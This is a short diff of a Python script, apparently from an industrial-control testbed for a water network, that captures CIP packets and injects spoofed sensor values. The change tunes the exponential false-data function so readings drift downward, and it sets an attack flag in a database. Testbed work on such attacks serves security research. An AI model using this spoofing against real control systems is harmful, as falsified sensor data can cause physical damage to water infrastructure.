@@ -47,11 +47,11 @@ def spoof_value(raw):
 
 def exponential_spoof(raw):
     print ("Spoofing-----------")
-    k = 5
-    t = 50
+    k = 20
+    t = 10
     float_value = translate_load_to_float(raw)
 
-    fake_value = float_value + k*(1-np.exp(-spoof_attack_counter/t))
+    fake_value = float_value - k*(1-np.exp(-spoof_attack_counter/t))
 
     c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
     conn.commit()
@@ -64,7 +64,6 @@ def capture(packet):
     if len(pkt) == 102:
         print("Capturing...")
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
-
         if sys.argv[3] == "empty_tank_1":
             if sys.argv[1] == '192.168.1.1':
                 pay = spoof_value(raw)
